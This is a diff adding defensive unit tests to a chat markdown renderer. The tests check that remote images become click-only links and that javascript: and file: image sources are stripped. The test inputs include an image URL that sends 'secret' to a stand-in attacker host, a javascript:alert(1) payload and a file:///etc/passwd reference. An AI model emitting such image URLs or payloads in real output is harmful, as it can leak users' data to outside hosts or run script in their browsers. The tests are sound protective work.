@@ -29,6 +29,45 @@ describe('chat markdown', () => {
     expect(html).toContain('click me');
   });
 
+  it('shows a web image as a link, so nothing loads without a click', () => {
+    const html = renderChatMarkdown(
+      '![chart](https://attacker.example/p.png?d=secret) ![](https://example.com/q.png)',
+    );
+    expect(html).not.toContain('<img');
+    expect(hrefs(html)).toEqual([
+      'https://attacker.example/p.png?d=secret',
+      'https://example.com/q.png',
+    ]);
+    expect(html).toContain('>chart</a>');
+    expect(html).toContain('>https://example.com/q.png</a>');
+  });
+
+  it('shows an image with another scheme as its alt text', () => {
+    const html = renderChatMarkdown('![a](javascript:alert(1)) ![b](file:///etc/passwd)');
+    expect(html).not.toMatch(/<(img|a)\b/);
+    expect(html).not.toContain('javascript:');
+    expect(html).not.toContain('file:');
+    expect(html).toContain('a b');
+  });
+
+  it('still shows an inline data image', () => {
+    const html = renderChatMarkdown('![dot](data:image/png;base64,iVBORw0KGgo=)');
+    expect(html).toContain('<img src="data:image/png;base64,iVBORw0KGgo=" alt="dot"');
+  });
+
+  it('keeps web images as links once code blocks are highlighted', async () => {
+    const source = '![x](https://attacker.example/p.png)\n\n```ts\nconst a = 1;\n```';
+    const html = createRoot(() =>
+      createChatMarkdown(
+        () => source,
+        () => false,
+      ),
+    );
+    await vi.waitFor(() => expect(html()).toContain('shiki-block'));
+    expect(html()).not.toContain('<img');
+    expect(hrefs(html())).toEqual(['https://attacker.example/p.png']);
+  });
+
   it('renders an unclosed code fence mid-stream without swallowing earlier text', () => {
     const html = renderChatMarkdown('Run this:\n\n```sh\nnpm test');
     expect(html).toContain('Run this:');
